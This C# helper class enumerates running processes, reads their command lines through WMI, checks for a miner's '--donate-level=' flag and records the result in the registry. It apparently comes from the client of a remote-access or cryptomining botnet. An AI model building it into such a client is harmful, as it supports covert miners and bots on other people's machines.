using System.Diagnostics;
using System.Linq;
using System.Management;

namespace Client.Helper
{
    class CheckMiner
    {
        public string GetProcess()
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (GetCommandLine(process).ToLower().Contains("--donate-level="))
                    {
                        SetRegistry.SetValue(Settings.Hwid, "1");
                        return "1";
                    }
                }
                catch { }
            }
            SetRegistry.SetValue(Settings.Hwid, "0");
            return "0";
        }

        public string GetCommandLine(Process process)
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id))
                using (ManagementObjectCollection objects = searcher.Get())
                {
                    return objects.Cast<ManagementBaseObject>().SingleOrDefault()?["CommandLine"]?.ToString();
                }
            }
            catch { }
            return "";
        }
    }
}
